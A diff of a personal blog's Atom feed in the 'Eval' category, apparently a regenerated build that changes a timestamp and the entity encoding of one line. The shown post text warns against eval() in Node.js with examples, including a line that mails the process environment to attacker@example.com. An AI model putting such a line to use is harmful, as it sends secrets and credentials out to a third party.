@@ -3,7 +3,7 @@
   <title><![CDATA[Category: Eval | Alessandro Nadalin]]></title>
   <link href="https://odino.org/categories/eval/atom.xml" rel="self"/>
   <link href="https://odino.org/"/>
-  <updated>2021-07-24T08:15:36+00:00</updated>
+  <updated>2021-07-25T08:48:47+00:00</updated>
   <id>https://odino.org/</id>
   <author>
     <name><![CDATA[Alessandro Nadalin]]></name>
@@ -46,7 +46,7 @@ eval(&lsquo;process.exit(0)&rsquo;)
 console.log(&lsquo;The application goes on&hellip;&rsquo;)</p>
 
 <p>// Let&rsquo;s escalate&hellip;
-eval(&lsquo;require(&ldquo;node-mailer&rdquo;).mail(&ldquo;<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x61;&#x74;&#116;&#x61;&#x63;&#x6b;&#101;&#114;&#64;&#x65;&#120;&#97;&#109;&#112;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#109;">&#97;&#x74;&#x74;&#x61;&#99;&#107;&#x65;&#114;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a>&rdquo;, JSON.stringify(process.ENV))&rsquo;)
+eval(&lsquo;require(&ldquo;node-mailer&rdquo;).mail(&ldquo;<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#97;&#116;&#x74;&#97;&#99;&#x6b;&#x65;&#x72;&#64;&#101;&#120;&#x61;&#109;&#x70;&#108;&#x65;&#46;&#x63;&#111;&#109;">&#97;&#116;&#x74;&#x61;&#x63;&#x6b;&#101;&#x72;&#x40;&#101;&#x78;&#97;&#109;&#112;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>&rdquo;, JSON.stringify(process.ENV))&rsquo;)
 console.log(&lsquo;The application goes on&hellip;&rsquo;)</p>
 
 <p>// And, for the lolz:
